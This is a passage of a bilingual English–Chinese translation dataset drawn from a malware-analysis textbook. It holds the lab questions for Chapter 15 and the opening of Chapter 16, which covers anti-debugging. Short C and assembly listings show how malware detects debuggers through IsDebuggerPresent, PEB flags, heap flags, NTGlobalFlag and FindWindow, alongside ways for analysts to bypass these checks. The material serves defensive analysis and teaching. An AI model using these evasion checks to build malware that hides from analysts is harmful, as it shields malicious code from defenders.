- en: Analyze the malware found in the file *Lab15-02.exe*. Correct all anti-disassembly
    countermeasures before analyzing the binary in order to answer the questions.
  id: totrans-701
  prefs: []
  type: TYPE_NORMAL
  zh: 分析文件 *Lab15-02.exe* 中发现的恶意软件。在分析二进制文件之前，先纠正所有反汇编反制措施，以便回答问题。
- en: '***Questions***'
  id: totrans-702
  prefs: []
  type: TYPE_NORMAL
  zh: '***问题***'
- en: 1\.
  id: totrans-703
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: What URL is initially requested by the program?
  id: totrans-704
  prefs: []
  type: TYPE_NORMAL
  zh: 程序最初请求什么 URL？
- en: 2\.
  id: totrans-705
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: How is the User-Agent generated?
  id: totrans-706
  prefs: []
  type: TYPE_NORMAL
  zh: 用户代理是如何生成的？
- en: 3\.
  id: totrans-707
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: What does the program look for in the page it initially requests?
  id: totrans-708
  prefs: []
  type: TYPE_NORMAL
  zh: 程序在它最初请求的页面中寻找什么？
- en: 4\.
  id: totrans-709
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: What does the program do with the information it extracts from the page?
  id: totrans-710
  prefs: []
  type: TYPE_NORMAL
  zh: 程序如何处理从页面中提取的信息？
- en: '**Lab 15-3**'
  id: totrans-711
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 15-3**'
- en: Analyze the malware found in the file *Lab15-03.exe*. At first glance, this
    binary appears to be a legitimate tool, but it actually contains more functionality
    than advertised.
  id: totrans-712
  prefs: []
  type: TYPE_NORMAL
  zh: 分析文件 *Lab15-03.exe* 中发现的恶意软件。乍一看，这个二进制文件似乎是一个合法的工具，但实际上它包含的功能比宣传的要多。
- en: '***Questions***'
  id: totrans-713
  prefs: []
  type: TYPE_NORMAL
  zh: '***问题***'
- en: 1\.
  id: totrans-714
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: How is the malicious code initially called?
  id: totrans-715
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意代码最初是如何调用的？
- en: 2\.
  id: totrans-716
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: What does the malicious code do?
  id: totrans-717
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意代码做了什么？
- en: 3\.
  id: totrans-718
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: What URL does the malware use?
  id: totrans-719
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件使用什么 URL？
- en: 4\.
  id: totrans-720
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: What filename does the malware use?
  id: totrans-721
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件使用什么文件名？
- en: '**350**'
  id: totrans-722
  prefs: []
  type: TYPE_NORMAL
  zh: '**350**'
- en: Chapter 15
  id: totrans-723
  prefs: []
  type: TYPE_NORMAL
  zh: 第 15 章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-724
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**A N T I - D E B U G G I N G**'
  id: totrans-725
  prefs: []
  type: TYPE_NORMAL
  zh: '**反调试**'
- en: '*Anti-debugging* is a popular anti-analysis technique used by malware to recognize
    when it is under the control'
  id: totrans-726
  prefs: []
  type: TYPE_NORMAL
  zh: '*反调试* 是恶意软件常用的反分析技术，用于识别其是否处于调试器的控制之下'
- en: of a debugger or to thwart debuggers. Malware authors
  id: totrans-727
  prefs: []
  type: TYPE_NORMAL
  zh: 阻止调试器。恶意软件作者
- en: know that malware analysts use debuggers to figure out
  id: totrans-728
  prefs: []
  type: TYPE_NORMAL
  zh: 知道恶意软件分析师使用调试器来找出
- en: how malware operates, and the authors use anti-debugging techniques in an attempt
    to slow down the analyst as much as possible. Once malware realizes that it is
    running in a debugger, it may alter its normal code execution path or modify the
    code to cause a crash, thus interfering with the analysts’ attempts to understand
    it, and adding time and additional overhead to their efforts.
  id: totrans-729
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件是如何运行的，作者使用反调试技术试图尽可能多地减缓分析师的工作。一旦恶意软件意识到它在调试器中运行，它可能会改变其正常的代码执行路径或修改代码以导致崩溃，从而干扰分析师理解它，并增加他们工作的时间和额外开销。
- en: There are many anti-debugging techniques—perhaps hundreds of them—
  id: totrans-730
  prefs: []
  type: TYPE_NORMAL
  zh: 存在许多反调试技术——可能数百种——
- en: and we’ll discuss only the most popular ones that we have encountered in the
    real world. We will present ways to bypass anti-debugging techniques, but our
    overall goal in this chapter (besides introducing you to specific techniques)
    is to help you to develop the skills that you’ll need to overcome new and previously
    unknown anti-debugging methods during analysis.
  id: totrans-731
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将讨论我们在现实世界中遇到的最流行的技术。我们将介绍绕过反调试技术的办法，但本章的总体目标（除了介绍具体技术之外）是帮助你在分析过程中克服新的和以前未知的新反调试方法所需的技能。
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-732
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Windows Debugger Detection**'
  id: totrans-733
  prefs: []
  type: TYPE_NORMAL
  zh: '**Windows 调试器检测**'
- en: Malware uses a variety of techniques to scan for indications that a debugger
    is attached, including using the Windows API, manually checking memory structure
    for debugging artifacts, and searching the system for residue left by a debugger.
    Debugger detection is the most common way that malware performs anti-debugging.
  id: totrans-734
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件使用各种技术来扫描调试器连接的迹象，包括使用 Windows API、手动检查调试器留下的内存结构，以及搜索调试器留下的系统残留。调试器检测是恶意软件执行反调试最常见的方式。
- en: '***Using the Windows API***'
  id: totrans-735
  prefs: []
  type: TYPE_NORMAL
  zh: '***使用 Windows API***'
- en: The use of Windows API functions is the most obvious of the anti-debugging techniques.
    The Windows API provides several functions that can be used by a program to determine
    if it is being debugged. Some of these functions were designed for debugger detection;
    others were designed for different purposes but can be repurposed to detect a
    debugger. A few of these functions use functionality not documented in the API.
  id: totrans-736
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 Windows API 函数是反调试技术中最明显的一种。Windows API 提供了几个函数，程序可以使用这些函数来确定它是否正在被调试。其中一些函数是为调试器检测而设计的；其他一些函数是为不同目的设计的，但可以重新用于检测调试器。其中一些函数使用了
    API 中未记录的功能。
- en: Typically, the easiest way to overcome a call to an anti-debugging API function
    is to manually modify the malware during execution to not call these functions
    or to modify the flag’s post call to ensure that the proper path is taken. A more
    difficult option would be to hook these functions, as with a rootkit.
  id: totrans-737
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，克服对反调试 API 函数调用的最简单方法是在执行过程中手动修改恶意软件，使其不调用这些函数，或者修改调用后的标志以确保采取正确的路径。一个更困难的选择是使用
    rootkit 钩住这些函数。
- en: 'The following Windows API functions can be used for anti-debugging: **IsDebuggerPresent**'
  id: totrans-738
  prefs: []
  type: TYPE_NORMAL
  zh: 以下 Windows API 函数可用于反调试：**IsDebuggerPresent**
- en: The simplest API function for detecting a debugger is IsDebuggerPresent.
  id: totrans-739
  prefs: []
  type: TYPE_NORMAL
  zh: 检测调试器的最简单 API 函数是 IsDebuggerPresent。
- en: This function searches the Process Environment Block (PEB) structure for the
    field IsDebugged, which will return zero if you are not running in the context
    of a debugger or a nonzero value if a debugger is attached.
  id: totrans-740
  prefs: []
  type: TYPE_NORMAL
  zh: 此函数在进程环境块（PEB）结构中搜索 IsDebugged 字段，如果您不在调试器的上下文中运行，它将返回零；如果附加了调试器，它将返回非零值。
- en: We’ll discuss the PEB structure in more detail in the next section.
  id: totrans-741
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将在下一节中更详细地讨论 PEB 结构。
- en: '**CheckRemoteDebuggerPresent**'
  id: totrans-742
  prefs: []
  type: TYPE_NORMAL
  zh: '**CheckRemoteDebuggerPresent**'
- en: This API function is nearly identical to IsDebuggerPresent. The name is misleading
    though, as it does not check for a debugger on a remote machine, but rather for
    a process on the local machine. It also checks the PEB structure for the IsDebugged
    field; however, it can do so for itself or another process on the local machine.
    This function takes a process handle as a parameter and will check if that process
    has a debugger attached. CheckRemoteDebuggerPresent can be used to check your
    own process by simply passing a handle to your process.
  id: totrans-743
  prefs: []
  type: TYPE_NORMAL
  zh: 此 API 函数几乎与 IsDebuggerPresent 相同。尽管名称具有误导性，因为它并不检查远程机器上的调试器，而是检查本地机器上的进程。它还会检查
    PEB 结构中的 IsDebugged 字段；然而，它可以为自己或本地机器上的另一个进程执行此操作。此函数以进程句柄作为参数，并将检查该进程是否附加了调试器。可以通过简单地传递您进程的句柄来使用
    CheckRemoteDebuggerPresent 检查您的进程。
- en: '**NtQueryInformationProcess**'
  id: totrans-744
  prefs: []
  type: TYPE_NORMAL
  zh: '**NtQueryInformationProcess**'
- en: This is a native API function in *Ntdll.dll* that retrieves information about
    a given process. The first parameter to this function is a process handle; the
    second is used to tell the function the type of process information to be retrieved.
    For example, using the value ProcessDebugPort (value 0x7) for this parameter will
    tell you if the process in question is currently being debugged. If the process
    is not being debugged, a zero will be returned; otherwise, a port number will
    be returned.
  id: totrans-745
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个在 *Ntdll.dll* 中原生的 API 函数，用于检索有关给定进程的信息。此函数的第一个参数是进程句柄；第二个参数用于告诉函数要检索的进程信息类型。例如，使用
    ProcessDebugPort（值 0x7）作为此参数的值将告诉您所讨论的进程是否正在被调试。如果进程没有被调试，将返回零；否则，将返回端口号。
- en: '**352**'
  id: totrans-746
  prefs: []
  type: TYPE_NORMAL
  zh: '**352**'
- en: Chapter 16
  id: totrans-747
  prefs: []
  type: TYPE_NORMAL
  zh: 第 16 章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-748
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**OutputDebugString**'
  id: totrans-749
  prefs: []
  type: TYPE_NORMAL
  zh: '**OutputDebugString**'
- en: This function is used to send a string to a debugger for display. It can be
    used to detect the presence of a debugger. For example, Listing 16-1
  id: totrans-750
  prefs: []
  type: TYPE_NORMAL
  zh: 此函数用于将字符串发送到调试器进行显示。它可以用来检测调试器的存在。例如，列表 16-1
- en: uses SetLastError to set the current error code to an arbitrary value. If OutputDebugString
    is called and there is no debugger attached, GetLastError should no longer contain
    our arbitrary value, because an error code will be set by the OutputDebugString
    function if it fails. If OutputDebugString is called and there is a debugger attached,
    the call to OutputDebugString should succeed, and the value in GetLastError should
    not be changed.
  id: totrans-751
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 SetLastError 将当前错误代码设置为任意值。如果调用 OutputDebugString 而没有附加调试器，GetLastError 应不再包含我们的任意值，因为如果
    OutputDebugString 失败，它将设置一个错误代码。如果调用 OutputDebugString 而有调试器附加，OutputDebugString
    的调用应该成功，并且 GetLastError 中的值不应改变。
- en: DWORD errorValue = 12345;
  id: totrans-752
  prefs: []
  type: TYPE_NORMAL
  zh: DWORD errorValue = 12345;
- en: SetLastError(errorValue);
  id: totrans-753
  prefs: []
  type: TYPE_NORMAL
  zh: SetLastError(errorValue);
- en: OutputDebugString("Test for Debugger");
  id: totrans-754
  prefs: []
  type: TYPE_NORMAL
  zh: OutputDebugString("Test for Debugger");
- en: if(GetLastError() == errorValue)
  id: totrans-755
  prefs: []
  type: TYPE_NORMAL
  zh: if(GetLastError() == errorValue)
- en: '{'
  id: totrans-756
  prefs: []
  type: TYPE_NORMAL
  zh: '{'
- en: ExitProcess();
  id: totrans-757
  prefs: []
  type: TYPE_NORMAL
  zh: ExitProcess();
- en: '}'
  id: totrans-758
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: else
  id: totrans-759
  prefs: []
  type: TYPE_NORMAL
  zh: else
- en: '{'
  id: totrans-760
  prefs: []
  type: TYPE_NORMAL
  zh: '{'
- en: RunMaliciousPayload();
  id: totrans-761
  prefs: []
  type: TYPE_NORMAL
  zh: 运行恶意有效载荷();
- en: '}'
  id: totrans-762
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: '*Listing 16-1: OutputDebugString anti-debugging technique*'
  id: totrans-763
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表16-1：OutputDebugString反调试技术*'
- en: '***Manually Checking Structures***'
  id: totrans-764
  prefs: []
  type: TYPE_NORMAL
  zh: '***手动检查结构***'
- en: Using the Windows API may be the most obvious method for detecting the presence
    of a debugger, but manually checking structures is the most common method used
    by malware authors. There are many reasons why malware authors are discouraged
    from using the Windows API for anti-debugging.
  id: totrans-765
  prefs: []
  type: TYPE_NORMAL
  zh: 使用Windows API可能是检测调试器存在最明显的方法，但手动检查结构是恶意软件作者最常用的方法。有许多原因使得恶意软件作者不鼓励使用Windows
    API进行反调试。
- en: For example, the API calls could be hooked by a rootkit to return false information.
    Therefore, malware authors often choose to perform the functional equivalent of
    the API call manually, rather than rely on the Windows API.
  id: totrans-766
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，API调用可能被rootkit挂钩以返回错误信息。因此，恶意软件作者通常选择手动执行API调用的功能等效，而不是依赖于Windows API。
- en: In performing manual checks, several flags within the PEB structure provide
    information about the presence of a debugger. Here, we’ll look at some of the
    commonly used flags for checking for a debugger.
  id: totrans-767
  prefs: []
  type: TYPE_NORMAL
  zh: 在执行手动检查时，PEB结构中的几个标志提供了有关调试器存在的信息。在这里，我们将查看一些用于检查调试器的常用标志。
- en: '**Checking the BeingDebugged Flag**'
  id: totrans-768
  prefs: []
  type: TYPE_NORMAL
  zh: '**检查BeingDebugged标志**'
- en: A Windows PEB structure is maintained by the OS for each running process, as
    shown in the example in Listing 16-2\. It contains all user-mode parameters associated
    with a process. These parameters include the process’s environment data, which
    itself includes environment variables, the loaded modules list, addresses in memory,
    and debugger status.
  id: totrans-769
  prefs: []
  type: TYPE_NORMAL
  zh: Windows操作系统为每个运行进程维护一个PEB（进程环境块）结构，如列表16-2中的示例所示。它包含与进程相关联的所有用户模式参数。这些参数包括进程的环境数据，它本身包括环境变量、加载的模块列表、内存地址和调试器状态。
- en: typedef struct _PEB {
  id: totrans-770
  prefs: []
  type: TYPE_NORMAL
  zh: typedef struct _PEB {
- en: BYTE Reserved1[2];
  id: totrans-771
  prefs: []
  type: TYPE_NORMAL
  zh: BYTE 保留1[2];
- en: BYTE **BeingDebugged**;
  id: totrans-772
  prefs: []
  type: TYPE_NORMAL
  zh: BYTE **BeingDebugged**;
- en: Anti-Debugging
  id: totrans-773
  prefs: []
  type: TYPE_NORMAL
  zh: 反调试
- en: '**353**'
  id: totrans-774
  prefs: []
  type: TYPE_NORMAL
  zh: '**353**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-775
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: BYTE Reserved2[1];
  id: totrans-776
  prefs: []
  type: TYPE_NORMAL
  zh: BYTE 保留2[1];
- en: PVOID Reserved3[2];
  id: totrans-777
  prefs: []
  type: TYPE_NORMAL
  zh: PVOID 保留3[2];
- en: PPEB_LDR_DATA Ldr;
  id: totrans-778
  prefs: []
  type: TYPE_NORMAL
  zh: PPEB_LDR_DATA Ldr;
- en: PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
  id: totrans-779
  prefs: []
  type: TYPE_NORMAL
  zh: PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
- en: BYTE Reserved4[104];
  id: totrans-780
  prefs: []
  type: TYPE_NORMAL
  zh: BYTE 保留4[104];
- en: PVOID Reserved5[52];
  id: totrans-781
  prefs: []
  type: TYPE_NORMAL
  zh: PVOID 保留5[52];
- en: PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  id: totrans-782
  prefs: []
  type: TYPE_NORMAL
  zh: PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
- en: BYTE Reserved6[128];
  id: totrans-783
  prefs: []
  type: TYPE_NORMAL
  zh: BYTE 保留6[128];
- en: PVOID Reserved7[1];
  id: totrans-784
  prefs: []
  type: TYPE_NORMAL
  zh: PVOID 保留7[1];
- en: ULONG SessionId;
  id: totrans-785
  prefs: []
  type: TYPE_NORMAL
  zh: ULONG SessionId;
- en: '} PEB, *PPEB;'
  id: totrans-786
  prefs: []
  type: TYPE_NORMAL
  zh: '} PEB, *PPEB;'
- en: '*Listing 16-2: Documented Process Environment Block (PEB) structure* While
    a process is running, the location of the PEB can be referenced by the location
    fs:[30h]. For anti-debugging, malware will use that location to check the BeingDebugged
    flag, which indicates whether the specified process is being debugged. Table 16-1
    shows two examples of this type of check.'
  id: totrans-787
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表16-2：已记录的进程环境块（PEB）结构* 当进程正在运行时，可以通过fs:[30h]的位置引用PEB的位置。为了反调试，恶意软件将使用该位置来检查BeingDebugged标志，该标志指示指定的进程是否正在被调试。表16-1显示了此类检查的两个示例。'
- en: '**Table 16-1:** Manually Checking the BeingDebugged Flag **mov method**'
  id: totrans-788
  prefs: []
  type: TYPE_NORMAL
  zh: '**表16-1：手动检查BeingDebugged标志**mov方法**'
- en: '**push/pop method**'
  id: totrans-789
  prefs: []
  type: TYPE_NORMAL
  zh: '**push/pop方法**'
- en: mov eax, dword ptr fs:[30h]
  id: totrans-790
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, dword ptr fs:[30h]
- en: push dword ptr fs:[30h]
  id: totrans-791
  prefs: []
  type: TYPE_NORMAL
  zh: push dword ptr fs:[30h]
- en: mov ebx, byte ptr [eax+2]
  id: totrans-792
  prefs: []
  type: TYPE_NORMAL
  zh: mov ebx, byte ptr [eax+2]
- en: pop edx
  id: totrans-793
  prefs: []
  type: TYPE_NORMAL
  zh: pop edx
- en: test ebx, ebx
  id: totrans-794
  prefs: []
  type: TYPE_NORMAL
  zh: test ebx, ebx
- en: cmp byte ptr [edx+2], 1
  id: totrans-795
  prefs: []
  type: TYPE_NORMAL
  zh: cmp byte ptr [edx+2], 1
- en: jz NoDebuggerDetected
  id: totrans-796
  prefs: []
  type: TYPE_NORMAL
  zh: jz NoDebuggerDetected
- en: je DebuggerDetected
  id: totrans-797
  prefs: []
  type: TYPE_NORMAL
  zh: je DebuggerDetected
- en: In the code on the left in Table 16-1, the location of the PEB is moved into
    EAX. Next, this offset plus 2 is moved into EBX, which corresponds to the offset
    into the PEB of the location of the BeingDebugged flag. Finally, EBX
  id: totrans-798
  prefs: []
  type: TYPE_NORMAL
  zh: 在表16-1的左侧代码中，将PEB的位置移动到EAX中。接下来，将此偏移量加2移动到EBX中，这对应于BeingDebugged标志在PEB中的偏移量。最后，EBX
- en: is checked to see if it is zero. If so, a debugger is not attached, and the
    jump will be taken.
  id: totrans-799
  prefs: []
  type: TYPE_NORMAL
  zh: 检查它是否为零。如果是，则没有附加调试器，并且将执行跳转。
- en: Another example is shown on the right side of Table 16-1\. The location of the
    PEB is moved into EDX using a push/pop combination of instructions, and then the
    BeingDebugged flag at offset 2 is directly compared to 1\.
  id: totrans-800
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个示例如表16-1的右侧所示。使用指令的push/pop组合将PEB的位置移动到EDX中，然后直接将偏移量为2的BeingDebugged标志与1进行比较。
- en: 'This check can take many forms, and, ultimately, the conditional jump determines
    the code path. You can take one of the following approaches to surmount this problem:'
  id: totrans-801
  prefs: []
  type: TYPE_NORMAL
  zh: 此检查可以采取多种形式，最终条件跳转决定了代码路径。您可以采取以下方法之一来克服这个问题：
- en: 
  id: totrans-802
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Force the jump to be taken (or not) by manually modifying the zero flag immediately
    before the jump instruction is executed. This is the easiest approach.
  id: totrans-803
  prefs: []
  type: TYPE_NORMAL
  zh: 在跳转指令执行之前立即手动修改零标志来强制跳转（或不跳转）。这是最简单的方法。
- en: 
  id: totrans-804
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Manually change the BeingDebugged flag to zero.
  id: totrans-805
  prefs: []
  type: TYPE_NORMAL
  zh: 手动将BeingDebugged标志设置为0。
- en: Both options are generally effective against all of the techniques described
    in this section.
  id: totrans-806
  prefs: []
  type: TYPE_NORMAL
  zh: 这两种选项通常对所有本节中描述的技术都有效。
- en: '**NOTE**'
  id: totrans-807
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*A number of OllyDbg plug-ins change the BeingDebugged flag for you. The most
    popular are Hide Debugger, Hidedebug, and PhantOm. All are useful for overcoming
    the* *BeingDebugged flag check and also help with many of the other techniques
    we discuss in* *this chapter.*'
  id: totrans-808
  prefs: []
  type: TYPE_NORMAL
  zh: '*许多OllyDbg插件会为您更改BeingDebugged标志。最受欢迎的是Hide Debugger、Hidedebug和PhantOm。所有这些都有助于克服BeingDebugged标志检查，并有助于本章中讨论的许多其他技术。*'
- en: '**354**'
  id: totrans-809
  prefs: []
  type: TYPE_NORMAL
  zh: '**354**'
- en: Chapter 16
  id: totrans-810
  prefs: []
  type: TYPE_NORMAL
  zh: 第16章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-811
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Checking the ProcessHeap Flag**'
  id: totrans-812
  prefs: []
  type: TYPE_NORMAL
  zh: '**检查进程堆标志**'
- en: An undocumented location within the Reserved4 array (shown in Listing 16-2),
    known as ProcessHeap, is set to the location of a process’s first heap allocated
    by the loader. ProcessHeap is located at 0x18 in the PEB structure. This first
    heap contains a header with fields used to tell the kernel whether the heap was
    created within a debugger. These are known as the ForceFlags and Flags fields.
  id: totrans-813
  prefs: []
  type: TYPE_NORMAL
  zh: 在保留4数组（如列表16-2所示）中的一个未记录的位置，称为进程堆（ProcessHeap），被设置为加载器为进程分配的第一个堆的位置。进程堆位于PEB结构中的0x18位置。这个第一个堆包含一个头部，其中包含用于告诉内核堆是否在调试器内创建的字段。这些字段被称为ForceFlags和Flags字段。
- en: Offset 0x10 in the heap header is the ForceFlags field on Windows XP, but for
    Windows 7, it is at offset 0x44 for 32-bit applications. Malware may also look
    at offset 0x0C on Windows XP or offset 0x40 on Windows 7 for the Flags field.
    This field is almost always equal to the ForceFlags field, but is usually ORed
    with the value 2\.
  id: totrans-814
  prefs: []
  type: TYPE_NORMAL
  zh: 在堆头部的0x10偏移量是Windows XP中的ForceFlags字段，但对于Windows 7，它位于32位应用程序的0x44偏移量。恶意软件也可能查看Windows
    XP上的0x0C偏移量或Windows 7上的0x40偏移量以获取Flags字段。此字段几乎总是等于ForceFlags字段，但通常与值2进行OR运算。
- en: Listing 16-3 shows the assembly code for this technique. (Note that two separate
    dereferences must occur.)
  id: totrans-815
  prefs: []
  type: TYPE_NORMAL
  zh: 列表16-3显示了这种技术的汇编代码。（注意，必须发生两次单独的间接引用。）
- en: mov eax, large fs:30h
  id: totrans-816
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, large fs:30h
- en: mov eax, dword ptr [eax+18h]
  id: totrans-817
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, dword ptr [eax+18h]
- en: cmp dword ptr ds:[eax+10h], 0
  id: totrans-818
  prefs: []
  type: TYPE_NORMAL
  zh: cmp dword ptr ds:[eax+10h], 0
- en: jne DebuggerDetected
  id: totrans-819
  prefs: []
  type: TYPE_NORMAL
  zh: jne DebuggerDetected
- en: '*Listing 16-3: Manual ProcessHeap flag check*'
  id: totrans-820
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表16-3：手动进程堆标志检查*'
- en: The best way to overcome this technique is to change the ProcessHeap flag manually
    or to use a hide-debug plug-in for your debugger. If you are using WinDbg, you
    can start the program with the debug heap disabled. For example, the command windbg
    –hd notepad.exe will start the heap in normal mode as opposed to debug mode, and
    the flags we’ve discussed won’t be set.
  id: totrans-821
  prefs: []
  type: TYPE_NORMAL
  zh: 克服这种技术的最好方法是手动更改进程堆标志或使用调试器的隐藏调试插件。如果您使用WinDbg，您可以使用禁用调试堆的方式启动程序。例如，命令windbg
    –hd notepad.exe将以正常模式启动堆，而不是调试模式，我们讨论的标志将不会设置。
- en: '**Checking NTGlobalFlag**'
  id: totrans-822
  prefs: []
  type: TYPE_NORMAL
  zh: '**检查NTGlobalFlag**'
- en: Since processes run slightly differently when started with a debugger, they
    create memory heaps differently. The information that the system uses to determine
    how to create heap structures is stored at an undocumented location in the PEB
    at offset 0x68\. If the value at this location is 0x70, we know that we are running
    in a debugger.
  id: totrans-823
  prefs: []
  type: TYPE_NORMAL
  zh: 由于进程在以调试器启动时运行略有不同，它们创建内存堆的方式也不同。系统用于确定如何创建堆结构的信息存储在PEB中的一个未记录位置，偏移量为0x68。如果此位置的值为0x70，我们知道我们正在调试器中运行。
- en: The value of 0x70 is a combination of the following flags when a heap is created
    by a debugger. These flags are set for the process if it is started from within
    a debugger.
  id: totrans-824
  prefs: []
  type: TYPE_NORMAL
  zh: 0x70的值是以下标志的组合，当调试器创建堆时。如果进程是从调试器内部启动的，则这些标志会设置为进程。
- en: (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)
    Listing 16-4 shows the assembly code for performing this check.
  id: totrans-825
  prefs: []
  type: TYPE_NORMAL
  zh: (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)
    列表16-4显示了执行此检查的汇编代码。
- en: mov eax, large fs:30h
  id: totrans-826
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, large fs:30h
- en: cmp dword ptr ds:[eax+68h], 70h
  id: totrans-827
  prefs: []
  type: TYPE_NORMAL
  zh: cmp dword ptr ds:[eax+68h], 70h
- en: jz DebuggerDetected
  id: totrans-828
  prefs: []
  type: TYPE_NORMAL
  zh: jz DebuggerDetected
- en: '*Listing 16-4: NTGlobalFlag check*'
  id: totrans-829
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表16-4：NTGlobalFlag检查*'
- en: Anti-Debugging
  id: totrans-830
  prefs: []
  type: TYPE_NORMAL
  zh: 反调试
- en: '**355**'
  id: totrans-831
  prefs: []
  type: TYPE_NORMAL
  zh: '**355**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-832
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The easiest way to overcome this technique is to change the flags manually or
    with a hide-debug plug-in for your debugger. If you are using WinDbg, you can
    start the program with the debug heap option disabled, as mentioned in the previous
    section.
  id: totrans-833
  prefs: []
  type: TYPE_NORMAL
  zh: 克服这种技术的最简单方法是通过手动更改标志或使用调试器的隐藏调试插件。如果你使用的是 WinDbg，你可以像前一个章节中提到的那样，禁用调试堆选项来启动程序。
- en: '***Checking for System Residue***'
  id: totrans-834
  prefs: []
  type: TYPE_NORMAL
  zh: '***检查系统残留***'
- en: 'When analyzing malware, we typically use debugging tools, which leave residue
    on the system. Malware can search for this residue in order to determine when
    you are attempting to analyze it, such as by searching registry keys for references
    to debuggers. The following is a common location for a debugger: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
    NT\CurrentVersion\AeDebug This registry key specifies the debugger that activates
    when an application error occurs. By default, this is set to Dr. Watson, so if
    it is changed to something like OllyDbg, malware may determine that it is under
    a microscope.'
  id: totrans-835
  prefs: []
  type: TYPE_NORMAL
  zh: 在分析恶意软件时，我们通常使用调试工具，这些工具会在系统中留下残留。恶意软件可以搜索这些残留，以确定你何时尝试分析它，例如通过搜索注册表键以查找对调试器的引用。以下是一个调试器的常见位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
    NT\CurrentVersion\AeDebug 这个注册表键指定了当应用程序发生错误时激活的调试器。默认情况下，它设置为 Dr. Watson，因此如果它被更改为
    OllyDbg，恶意软件可能会确定它正在被放大镜观察。
- en: Malware can also search the system for files and directories, such as common
    debugger program executables, which are typically present during malware analysis.
    (Many backdoors already have code in place to traverse filesystems.) Or the malware
    can detect residue in live memory, by viewing the current process listing or,
    more commonly, by performing a FindWindow in search of a debugger, as shown in
    Listing 16-5\.
  id: totrans-836
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件也可以在系统中搜索文件和目录，例如常见的调试程序可执行文件，这些文件通常在恶意软件分析期间存在。（许多后门已经内置了遍历文件系统的代码。）或者恶意软件可以通过查看当前进程列表或更常见的是，通过执行
    FindWindow 操作来检测调试器，如列表 16-5 所示。
- en: if(**FindWindow**("OLLYDBG", 0) == NULL)
  id: totrans-837
  prefs: []
  type: TYPE_NORMAL
  zh: if(**FindWindow**("OLLYDBG", 0) == NULL)
- en: '{'
  id: totrans-838
  prefs: []
  type: TYPE_NORMAL
  zh: '{'
- en: //Debugger Not Found
  id: totrans-839
  prefs: []
  type: TYPE_NORMAL
  zh: //调试器未找到
- en: '}'
  id: totrans-840
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: else
  id: totrans-841
  prefs: []
  type: TYPE_NORMAL
  zh: else
- en: '{'
  id: totrans-842
  prefs: []
  type: TYPE_NORMAL
  zh: '{'
- en: //Debugger Detected
  id: totrans-843
  prefs: []
  type: TYPE_NORMAL
  zh: //调试器已检测到
- en: '}'
  id: totrans-844
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: '*Listing 16-5: C code for FindWindow detection*'
  id: totrans-845
  prefs: []
  type: TYPE_NORMAL
  zh: '*列出 16-5：用于 FindWindow 检测的 C 代码*'
